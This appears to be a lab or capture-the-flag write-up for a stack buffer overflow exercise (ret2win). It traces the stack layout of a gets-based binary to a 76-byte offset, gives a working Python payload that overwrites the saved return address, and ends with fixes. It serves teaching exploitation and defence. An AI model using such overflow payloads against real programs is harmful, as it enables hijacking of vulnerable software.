# ex04 — Saved return address overwrite (classic ret2win)

Goal: `code flow successfully changed`

## Assembly

```
080483f4 <win>:
    puts("code flow successfully changed")
    ret

08048408 <main>:
    push   ebp
    mov    ebp, esp
    and    esp, 0xfffffff0        ; 16-byte align
    sub    esp, 0x50               ; locals
    lea    eax, [esp+0x10]         ; &buffer
    call   gets                    ; VULN
    leave                          ; mov esp, ebp; pop ebp
    ret                            ; pops saved eip
```

There is **no target variable and no indirect call** in main — the program
just returns. The exploit target is the saved return address on the stack.

## Stack layout at `gets`

x86 Linux ABI: `esp` is 16-byte aligned before `call main`. So on entry to
`main`, esp = 16k − 4. Tracing:

```
push ebp              → esp = 16k - 8
mov  ebp, esp         → ebp = 16k - 8
and  esp, ~0xf        → esp = 16k - 16
sub  esp, 0x50        → esp = 16k - 96
buffer = esp + 0x10   → 16k - 80
retaddr location      → 16k - 4    (pushed by CALL to main)
```

Distance from `buffer[0]` to saved-EIP: `(16k − 4) − (16k − 80) = 76`.

```
   +---------------+ retaddr        (offset 76)
   | saved ebp     | 4 bytes        (offset 72)
   | pad (align)   | 8 bytes        (offset 64)
   | buffer[80]    | offsets 0..63 are the buffer proper
   +---------------+
```

The 8 alignment bytes and the saved ebp all sit between the buffer end and the
return address; total padding = 76.

## Exploit

```bash
python3 -c "
import sys, struct
sys.stdout.buffer.write(b'A'*76 + struct.pack('<I', 0x080483f4) + b'\n')
" | python3 solutions/run_pty.py --stdin ./ex04/bin
```

Output (via the pty helper so `puts()` flushes before the SIGSEGV):

```
code flow successfully changed
[signal=11]
```

The SIGSEGV after the win message is expected — after `puts()`, `win` executes
its own `ret`, which pops garbage into EIP. We only needed the win banner.

## Why the pty helper

`puts` writes to fully-buffered `stdout` when stdout is a pipe. If the process
is killed before libc flushes, the message is lost. Running under a pty makes
stdout line-buffered, so the newline in `"…changed\n"` flushes immediately.

## Fix

`gets` is unfixable; remove it (glibc has already deprecated it away). Add
stack canaries (`-fstack-protector-all`) so overwritten saved-EIPs get
detected before `ret`.
